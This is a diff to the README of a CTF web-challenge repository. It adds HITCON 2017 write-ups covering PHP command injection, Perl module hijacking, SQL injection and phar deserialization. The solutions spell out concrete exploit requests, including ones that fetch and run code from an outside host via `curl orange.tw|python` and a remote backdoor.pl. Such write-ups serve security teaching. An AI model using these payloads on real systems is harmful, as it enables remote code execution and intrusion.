@@ -1,24 +1,37 @@
 # My CTF Web Challenges
 
 
-Hi, I am Orange. This is the repo of CTF challenges I made. It contains challs's source code, writeup and some idea explanation.  
+Hi, I am Orange. This is the repo of CTF challenges I made. It contains challenge's source code, writeup and some idea explanation.  
 
 
-I am a CTFer and Bug Bounty Hunter, loving web hacking and penetration testing. So you will see these challs are all about web. If you have any question about these challs, you can find me in following ways  
-* orange@chroot.org   
-* [blog.orange.tw](http://blog.orange.tw/)   
+I am a CTFer and Bug Bounty Hunter, loving web hacking and penetration testing. So you will see these challs are all about web. If you have any question about these challs, you can find me in following ways  
+
+* orange@chroot.org   
+* [blog.orange.tw](http://blog.orange.tw/)   
 
 
 <br>
-Hope you will like it :)  
+Hope you like it :)  
 
 
-**P.s.** By the way, [Babyfirst](#babyfirst) is my favorite one in all of these  challenges, if you don't have time to see all, please look it at lease!
+**P.s.** BTW, the series of `Babyfirst` are my favorite in all of these challenges. There are open questions to all and there are lots of creative solutions. If you don't have time to see all, please look the them at least!
+
+* [Babyfirst](#babyfirst)  
+* [Babyfirst Revenge](#babyfirst-revenge)  
+* [Babyfirst Revenge v2](#babyfirst-revenge-v2)  
+
 <br>
 
 
 
 ## **Table of Content**
+
+* [HITCON 2017 Quals](#babyfirst-revenge)
+    * [BabyFirst Revenge](#babyfirst-revenge)
+    * [BabyFirst Revenge v2](#babyfirst-revenge-v2)
+    * [SSRFme?](#ssrfme)
+    * [SQL so Hard](#sql-so-hard)
+    * [Baby^H Master PHP 2017](#baby^h-master-php-2017)  
 
 * [HITCON 2016 Quals](#papapa)
     * [%%%](#papapa)
@@ -47,15 +60,201 @@ Hope you will like it :)  
     
 <br>
 
+## **BabyFirst Revenge**
+  
+Difficulty: **★☆**  
+Sovled: **71 / 1024**  
+Tag:  **WhiteBox**, **PHP**, **Command Injection**  
+
+#### Idea
+
+* Command Injection, but only in **5** bytes  
+
+#### Source Code
+
+* [index.php](hitcon-ctf-2017/babyfirst-revenge/index.php)  
+
+#### Solution
+
+```bash
+# generate `ls -t>g` to file "_"
+http://host/?cmd=>ls\
+http://host/?cmd=ls>_
+http://host/?cmd=>\ \
+http://host/?cmd=>-t\
+http://host/?cmd=>\>g
+http://host/?cmd=ls>>_
+
+# generate `curl orange.tw|python` to file "g"
+http://host/?cmd=>on
+http://host/?cmd=>th\
+http://host/?cmd=>py\
+http://host/?cmd=>\|\
+http://host/?cmd=>tw\
+http://host/?cmd=>e.\
+http://host/?cmd=>ng\
+http://host/?cmd=>ra\
+http://host/?cmd=>o\
+http://host/?cmd=>\ \
+http://host/?cmd=>rl\
+http://host/?cmd=>cu\
+http://host/?cmd=sh _
+
+# got shell
+http://host/?cmd=sh g
+```
+
+You can check the [exploit.py](hitcon-ctf-2017/babyfirst-revenge/exploit.py) for the detail! And there are also lots of creative solutions, you can check the write ups below.
+
+
+#### Write Ups
+
+  TBD
+
+
+
+## **BabyFirst Revenge v2**
+  
+Difficulty: **★★★★**  
+Sovled: **71 / 1024**  
+Tag:  **WhiteBox**, **PHP**, **Command Injection**  
+
+#### Idea
+
+* Command Injection, but only in **4** bytes  
+
+#### Source Code
+
+* [index.php](hitcon-ctf-2017/babyfirst-revenge-v2/index.php)  
+
+#### Solution
+
+1. generate `g> ht- sl` to file `v`
+2. reverse file `v` to file `x`
+4. generate `curl orange.tw|python;`
+6. execute `x`, `ls -th >g`
+7. execute `g`
+
+You can check [exploit.py](hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py) for the detail!
+
+
+#### Write Ups
+
+  TBD
+
+
+
+## **SSRFme?**
+  
+Difficulty: **★★☆**  
+Sovled: **71 / 1024**  
+Tag:  **WhiteBox**, **Perl**, **PATH Pollution**  
+
+#### Idea
+
+* [CVE-2016-1238](https://perl5.git.perl.org/perl.git/commit/cee96d52c39b1e7b36e1c62d38bcd8d86e9a41ab) (But the latest version of Ubuntu 17.04 in AWS is still vulnerable)  
+* Perl lookup current directory in module importing  
+* Perl module [URI/lib/URI.pm#L136](https://github.com/libwww-perl/URI/blob/b7680860f323a0cf3ffe5f6bdb684646e1ecac33/lib/URI.pm#L136) will `eval` if there is a  unknown scheme
+
+#### Source Code
+
+* [index.php](hitcon-ctf-2017/ssrfme/index.php)  
+
+```bash
+$ sudo apt install libwww-perl
+```
+
+#### Solution
+
+```bash
+# write evil URI module to current directory
+$ curl http://host/?filename=URI/orange.pm&url=http://orange.tw/w/backdoor.pl
+
+# eval evil module `orange`
+$ curl http://host/?filename=xxx&url=orange://orange.tw
+```
+
+#### Write Ups
+
+  TBD
+
+
+
+## **SQL so Hard**
+  
+Difficulty: **★★★**  
+Sovled: **71 / 1024**  
+Tag:  **WhiteBox**, **MySQL**, **PostgreSQL**, **SQL Injection**, **Code Injection**  
+
+#### Idea
+
+* MySQL `max_allowed_packet` dropped large size SQL sentence  
+* [Node-Postgres - code execution vulnerability](https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability)  
+* Exploit the RCE in SQL `UPDATE` syntax
+
+#### Source Code
+
+* [app.js](hitcon-ctf-2017/sql-so-hard/app.js)  
+
+#### Solution
+
+* [exploit.py](hitcon-ctf-2017/sql-so-hard/exploit.py)  
+
+#### Write Ups
+
+  TBD
+
+
+## **Baby^H Master PHP 2017**
+  
+Difficulty: **★★★★☆**  
+Sovled: **0 / 1024**  
+Tag:  **WhiteBox**, **PHP**, **Serialization**, **Apache Prefock**  
+
+#### Idea
+
+* PHP do the de-serialization on `PHAR` parsing
+* PHP assigned a predictable function name `\x00lambda_%d` to an anonymous function  
+* Break shared VARIABLE state in Apache Pre-fork mode
+
+#### Source Code
+
+* [index.php](hitcon-ctf-2017/baby^h-master-php-2017/index.php)  
+
+#### Solution
+
+```bash
+# get a cookie
+$ curl http://host/ --cookie-jar cookie
+
+# download .phar file from http://orange.tw/avatar.gif
+$ curl -b cookie 'http://host/?m=upload&url=http://orange.tw/'
+
+# force apache to fork new process
+$ python fork.py &
+
+# get flag
+$ curl -b cookie "http://host/?m=upload&url=phar:///var/www/data/$MD5_IP/&lucky=%00lambda_1"
+```
+
+* [avatar.gif](hitcon-ctf-2017/baby^h-master-php-2017/avatar.gif)  
+* [fork.py](hitcon-ctf-2017/baby^h-master-php-2017/fork.py)
+
+#### Write Ups
+
+  No one solve it :(
+
+
+
 ## **papapa**
   
 Difficulty: **★**  
 Sovled: **71 / 1024**  
 Tag:  **BlackBox**, **SSL**, **Pentesting**  
 
-#### Idea:
+#### Idea
 
-* Use SSL certificate to leak internal hostname  
+* Leak the internal hostname from SSL certificate  
 
 #### Source Code
 
@@ -87,7 +286,7 @@ Difficulty: **★★**
 Sovled: **43 / 1024**  
 Tag: **WhiteBox**, **JavaScript**, **NodeJS**  
 
-#### Idea:
+#### Idea
 
 * Break JavaScript Sandbox
 * Use NodeJS `Buffer(int)` to steal uninitialized memory  
@@ -118,7 +317,7 @@ Difficulty: **★★★**
 Sovled: **24 / 1024**  
 Tag: **WhiteBox**, **PHP**, **MySQL**, **SQL Injection**, **Unserialize**
 
-#### Idea:
+#### Idea
 
 * [Create an Unexpected Object and Don't Invoke \_\_wakeup() in Deserialization](https://bugs.php.net/bug.php?id=72663)
 * [SugarCRM v6.5.23 PHP反序列化對象注入漏洞](http://blog.knownsec.com/2016/09/sugarcrm-v6-5-23-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/)
@@ -155,7 +354,7 @@ Difficulty: **★★☆**
 Sovled: **43 / 1024**  
 Tag: **GrayBox**, **Java**
 
-#### Idea:
+#### Idea
 
 * `new String(new byte[] {1, -1, 1, -1})` will output `01EFBFBD01EFBFBD`, not `01FF01FF`
 * [When ‘EFBFBD’ And Friends Come Knocking: Observations Of Byte Array To String Conversions](https://blog.gdssecurity.com/labs/2015/2/18/when-efbfbd-and-friends-come-knocking-observations-of-byte-a.html)
@@ -180,7 +379,7 @@ Difficulty: **★★★★**
 Sovled: **4 / 1024**  
 Tag: **GrayBox**, **Java**, **Seam Framework**, **CSS RPO**, **EL Injection**, **Java Deserialization**  
 
-#### Idea:
+#### Idea
 
 * CSS Relative Path Overwrite  
 * Built-in redirection parameter `actionOutcome`  
@@ -325,7 +524,7 @@ Difficulty: **★★★**
 Sovled: **18 / 969**  
 Tag: **GrayBox**, **C**, **PWN**  
 
-#### Idea:
+#### Idea
 * Pwn without library  
 * Format String without output  
 * Bypass Stack Guard by using overflow `ARGV[1]`  
@@ -351,7 +550,7 @@ Difficulty: **★★★☆**
 Sovled: **16 / 969**  
 Tag:  **WhiteBox**, **PHP**  
 
-#### Idea:
+#### Idea
 * Break PHP PRNG  
 * Break shared PRNG STATE in Apache Prefork mode  
 
@@ -376,7 +575,7 @@ Difficulty: **★★★☆**
 Sovled: **2 / 969**  
 Tag: **BlackBox**, **PHP**, **SSRF**  
 
-#### Idea:
+#### Idea
 
 * Bypass SSRF restrictiton with 302 redirect  
 * Exploit FASTCGI protocol by using GOPHER  
@@ -434,7 +633,7 @@ Platform:  **BlackBox**, **PHP**, **H2**, **SQL Injection**
 #### Idea  
 
 * SQL Injection on H2 Database  
-* Execute Code by using H2 SQL Injection  
+* Execute Code by using H2 SQL Injection  
 
 #### Source Code
 
@@ -524,7 +723,7 @@ Tag: **GrayBox**, **PHP**, **JAVA**, **mod_jk**, **H2**, **SQL Injection**, **WA
 * Default and up to date mod_jk leads to directory travesal  
 * Bypass WAF by incorrect usage of BASE64 and URLENCODE  
 * SQL Injection on H2 Database  
-* Execute Code by using H2 SQL Injection  
+* Execute Code by using H2 SQL Injection  
 
 #### Source Code  
 
